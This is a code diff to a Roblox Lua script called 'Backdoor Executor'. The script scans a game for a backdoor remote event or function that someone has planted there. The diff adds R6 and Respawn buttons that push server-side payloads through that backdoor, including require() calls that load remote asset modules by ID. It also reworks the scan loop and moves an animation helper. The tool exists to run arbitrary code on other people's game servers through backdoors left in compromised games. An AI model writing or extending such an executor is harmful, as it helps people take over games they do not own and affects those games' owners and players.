@@ -117,37 +117,38 @@ local SAFE_LOCATIONS = {
 				end
 			end
 
-			local timeoutDuration = 1
-			local checkInterval = 1 or 3
-			local elapsed = 0
+			local timeoutDuration = 5
+local startCheck = os.clock()
 
-			while elapsed < timeoutDuration do
-				task.wait(checkInterval)
-				elapsed += checkInterval
+while not backdoorFound and (os.clock() - startCheck) < timeoutDuration do
+	task.wait()
+	for i = #activeTestIds, 1, -1 do
+		local testId = activeTestIds[i]
+		local testData = activeTests[testId]
 
-				for i = #activeTestIds, 1, -1 do
-					local testId = activeTestIds[i]
-					local testData = activeTests[testId]
+		if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
+			testData.found = true
+			backdoorFound = true
 
-					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
-						testData.found = true
-						backdoorFound = true
-						if testData.isFunction then
-							remoteFunction = testData.remote
-						else
-							remoteEvent = testData.remote
-						end
-						print("Backdoor found:", testData.remote:GetFullName())
-						timeToFindExploit = os.clock() - initialScanStart
-						activeTests[testId] = nil
-						table.remove(activeTestIds, i)
-						local f = ReplicatedStorage:FindFirstChild(testId)
-						if f then f:Destroy() end
-						break
-					end
-				end
-				if backdoorFound then break end
+			if testData.isFunction then
+				remoteFunction = testData.remote
+			else
+				remoteEvent = testData.remote
 			end
+
+			print("Backdoor found:", testData.remote:GetFullName())
+			timeToFindExploit = os.clock() - initialScanStart
+
+			activeTests[testId] = nil
+			table.remove(activeTestIds, i)
+
+			local f = ReplicatedStorage:FindFirstChild(testId)
+			if f then f:Destroy() end
+
+			break
+		end
+	end
+end
 		end
 
 		scanTime = os.clock() - initialScanStart
@@ -174,7 +175,7 @@ local SAFE_LOCATIONS = {
 			if backdoorFound then
 				StarterGui:SetCore("SendNotification", {
 					Title = "Backdoor Executor",
-					Text = "Backdoor found in " .. string.format("%.2f", timeToFindExploit) .. " s",
+					Text = "Backdoor found in " .. tostring(timeToFindExploit) .. "s",
 					Duration = 5,
 				})
 			else
@@ -194,7 +195,7 @@ local function RunPayload(code)
 	end
 end
 
-task.wait(1)
+task.wait(1.5)
 if backdoorFound then
 	local Players = game:GetService("Players")
 
@@ -271,6 +272,88 @@ ScreenGui.Name = "BackdoorExecutor"
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 
+
+
+local buttonCache = {}
+
+
+
+
+local function animateClick(button)
+
+    if not buttonCache[button] then
+
+        buttonCache[button] = {
+
+            Position = button.Position,
+
+            Size = button.Size
+
+        }
+
+    end
+
+
+
+    local original = buttonCache[button]
+
+
+
+    local pressTween =
+
+        TweenService:Create(
+
+        button,
+
+        TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+
+        {
+
+            Position = original.Position + UDim2.new(0, 0, 0, 2),
+
+            Size = original.Size - UDim2.new(0, 0, 0, 2)
+
+        }
+
+    )
+
+
+
+    local releaseTween =
+
+        TweenService:Create(
+
+        button,
+
+        TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+
+        {
+
+            Position = original.Position,
+
+            Size = original.Size
+
+        }
+
+    )
+
+
+
+    pressTween:Play()
+
+
+
+    pressTween.Completed:Connect(
+
+        function()
+
+            releaseTween:Play()
+
+        end
+
+    )
+
+end
 
 local MainFrame = Instance.new("Frame", ScreenGui)
 
@@ -588,6 +671,90 @@ MinimizeButton.TextSize = 24
 
 
 MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+
+
+local R6Button = Instance.new("TextButton", ContentFrame)
+
+
+
+R6Button.Size = UDim2.new(0, 45, 0, 30)
+
+
+
+R6Button.Position = UDim2.new(
+	MinimizeButton.Position.X.Scale,
+	MinimizeButton.Position.X.Offset - 10 - 45,
+	MinimizeButton.Position.Y.Scale,
+	MinimizeButton.Position.Y.Offset
+)
+
+
+
+R6Button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+R6Button.Text = "R6"
+R6Button.Font = Enum.Font.GothamBold
+R6Button.TextSize = 14
+R6Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+R6Button.AutoButtonColor = true
+
+
+
+Instance.new("UICorner", R6Button).CornerRadius = UDim.new(0, 6)
+
+
+
+R6Button.MouseButton1Click:Connect(function()
+    FireButtonClickSound()
+    animateClick(R6Button)
+	if backdoorFound then
+        RunPayload(
+	    'require(3436957371):r6("' .. LocalPlayer.Name .. '")'
+        )
+	end
+end)
+
+
+
+local RespawnButton = Instance.new("TextButton", ContentFrame)
+
+
+
+RespawnButton.Size = UDim2.new(0, 85, 0, 30)
+
+
+
+RespawnButton.Position = UDim2.new(
+	R6Button.Position.X.Scale,
+	R6Button.Position.X.Offset - 10 - 85,
+	R6Button.Position.Y.Scale,
+	R6Button.Position.Y.Offset
+)
+
+
+
+RespawnButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+RespawnButton.Text = "Respawn"
+RespawnButton.Font = Enum.Font.GothamBold
+RespawnButton.TextSize = 14
+RespawnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+RespawnButton.AutoButtonColor = true
+
+
+
+Instance.new("UICorner", RespawnButton).CornerRadius = UDim.new(0, 6)
+
+
+
+RespawnButton.MouseButton1Click:Connect(function()
+    FireButtonClickSound()
+    animateClick(RespawnButton)
+	if backdoorFound then
+		RunPayload(
+	    'game.Players["' .. LocalPlayer.Name .. '"]:LoadCharacter()'
+        )
+	end
+end)
 
 
 
@@ -918,88 +1085,6 @@ local function logToConsole(prefix, text, color)
     
     
     label.AutomaticSize = Enum.AutomaticSize.Y
-end
-
-
-
-local buttonCache = {}
-
-
-
-local function animateClick(button)
-
-    if not buttonCache[button] then
-
-        buttonCache[button] = {
-
-            Position = button.Position,
-
-            Size = button.Size
-
-        }
-
-    end
-
-
-
-    local original = buttonCache[button]
-
-
-
-    local pressTween =
-
-        TweenService:Create(
-
-        button,
-
-        TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-
-        {
-
-            Position = original.Position + UDim2.new(0, 0, 0, 2),
-
-            Size = original.Size - UDim2.new(0, 0, 0, 2)
-
-        }
-
-    )
-
-
-
-    local releaseTween =
-
-        TweenService:Create(
-
-        button,
-
-        TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
-
-        {
-
-            Position = original.Position,
-
-            Size = original.Size
-
-        }
-
-    )
-
-
-
-    pressTween:Play()
-
-
-
-    pressTween.Completed:Connect(
-
-        function()
-
-            releaseTween:Play()
-
-        end
-
-    )
-
 end
 
 
@@ -1839,13 +1924,6 @@ _G.AddButton(
     "Happy Hub SS",
     'require(135231466738957):Hload("' .. LocalPlayer.Name .. '")'
 )
-
-_G.AddButton("R6 Convert", 'require(3436957371):r6("' .. LocalPlayer.Name .. '")')
-
-
-
-_G.AddButton("Respawn Character", 'game.Players["' .. LocalPlayer.Name .. '"]:LoadCharacter()')
-
 
 
 _G.AddButton(
